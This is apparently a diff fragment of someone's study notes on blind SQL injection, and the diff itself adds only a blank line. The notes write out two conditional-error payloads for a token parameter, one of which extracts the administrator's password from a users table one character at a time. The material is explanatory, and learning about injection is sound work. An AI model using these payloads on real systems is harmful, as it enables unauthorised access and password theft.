@@ -25,3 +25,4 @@ in blind sql we can see the data but we can manipulate it to conclude the data
     token='xyz' and (select case when 1=1 then 1/0 else 'a' end) = 'a  ->  return zero division error
     Example:
       token='xyz' and (select case when (username = 'administrator' and substring(password, 1, 1) > 'm') then 1/0 else 'a' end from users) = 'a 
+
